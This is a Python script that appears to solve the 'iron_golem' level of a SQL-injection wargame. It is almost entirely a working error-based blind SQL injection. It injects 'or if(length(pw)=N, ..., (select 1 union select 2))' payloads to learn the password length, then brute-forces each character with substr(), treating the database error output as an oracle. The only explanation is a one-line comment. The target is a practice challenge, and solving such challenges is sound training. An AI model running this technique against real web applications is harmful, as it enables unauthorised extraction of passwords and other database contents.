#!/usr/bin/env python3

'''
# Summary
- we can use if() or "case when then else" to check the query was active or not
'''


import requests
import string

header = {"Cookie": "PHPSESSID=❚❚❚❚❚❚❚❚❚❚❚❚❚❚❚❚❚❚❚❚❚❚❚❚❚❚❚❚❚❚;"}
url = "https://los.rubiya.kr/chall/iron_golem_beb244fe41dd33998ef7bb4211c56c75.php"
string_data = string.digits + string.ascii_letters

print(string_data)

pw = ""
pw_len = 1

# find pw length
while True:
    data = "?pw=' or if(length(pw)={},1,(select 1 union select 2))%23".format(str(pw_len))
    response = requests.get(url + data, headers=header)
    if response.text.find("<hr>query") != -1:
        break
    print("[*] Finding... : " + str(pw_len))
    pw_len += 1
print("[+] Get pw Length : " + str(pw_len))

# find pw
for idx in range(1, pw_len + 1):
    for i in string_data:
        data = "?pw=' or if(substr(pw,{},1)='{}',1,(select 1 union select 2))%23".format(str(idx), i)
        response = requests.get(url + data, headers=header)
        if response.text.find("<hr>query") != -1:
            pw = pw + i
            print("[*] Finding... : " + pw)
            break

print("[+] Found pw : " + pw)

payload = "?pw="+pw

response = requests.get(url + payload, headers=header)

result = response.text
if result.find("Clear!") != -1:
    end = result.split("Clear!")[0].split("<h2>")[1]
    if end.find("admin") != -1:
        end = result.split("Clear!")[0].split("<h2>")[2]
    print(end+"Clear!")